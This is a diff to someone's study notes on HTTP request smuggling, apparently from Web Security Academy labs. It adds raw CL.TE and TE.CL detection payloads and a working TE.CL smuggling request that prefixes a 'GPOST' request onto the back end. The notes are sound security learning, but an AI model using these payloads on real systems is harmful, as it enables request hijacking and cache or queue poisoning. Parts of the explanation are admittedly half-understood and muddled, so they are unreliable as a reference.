@@ -36,7 +36,7 @@ The classic attack is to provide both header in the HTTP request and try to mani
 
 Most modern browsers use HTTP/2 to prevent the attack, so it needs to be changed manually some times.
 
-### Notes : 
+### Note : 
 Prepare burp for request smuggling
 
 1. Downgrade to HTTP/1
@@ -52,6 +52,7 @@ Prepare burp for request smuggling
 
 ## DETECT CL.TE vulnerability
 
+The front end uses CL and the back uses TE
 We create this payload as the following 
 
     POST / HTTP/1.1
@@ -72,8 +73,61 @@ it' because that the front end won't be sending `X\r\n`, and looks at the chunke
 ![CL.TE](CL.TE.png)
 
 
+## Detect TE.CL vulnerability
+
+Send the same payload, and we should have an 400 error 'Invalid request'
+
+it's because the front will read the first 3 bytes, and expect a hexadecimal value, instead it'll find an X, and throw an .error
+regarding the backend, we throw this payload 
+
+    POST / HTTP/1.1
+    Host: 0a6e005704daed308085a8fa008800f1.web-security-academy.net
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 6
+    Transfer-Encoding: chunked
+    \r\n
+    0\r\n
+    \r\n
+    X
+
+and we should receive a timeout, it's because the front end is using TE and it'll send only `0\r\n \r\n` and since the server is using CL (hypothesis) it will read the content-length of 6 and will receive only 5, and i'll wait for the end until a time-out.
+
+![TE.CL](TE.CL_discovery.png)
+
+## TE.CL attack
+
+![TE.CL](TE.CL-attack.png)
+// didn't understand it a 100%
+
+BUT : since the front end is using TE, we will use it to poison the backend server with the content length so just `1\r\n` will be processed, and the rest will be on hold, and it will be appended as a prefix to the next request to the backend.
+
+So solve the lab, to have a GPOST : 
+The payload will be the following : 
+
+    POST / HTTP/1.1
+    Host: 0a800053040d759d80be171500e800ba.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    5c
+    GPOST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 11
+    \r\n
+    x=1\r\n
+    0\r\n
+    \r\n
+
+ and the next request will be normal 
+
+    POST / HTTP/1.1
+    Host: 0a800053040d759d80be171500e800ba.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 12
+
+    Foo=bar 
 
 
-
-
-
+So the front end will process the normal request as it uses chunked we have to specify the size of the chunked which is `5c` which is the length of the request from `GPOST` until `x=1` since it's a post method, the x=1 it's just a random value, next for the content-length we have to set if the length of the poisoned request +1, in order to make the the back-end wait for the extra byte, other wise if it's correct, it will just process it as a normal request.
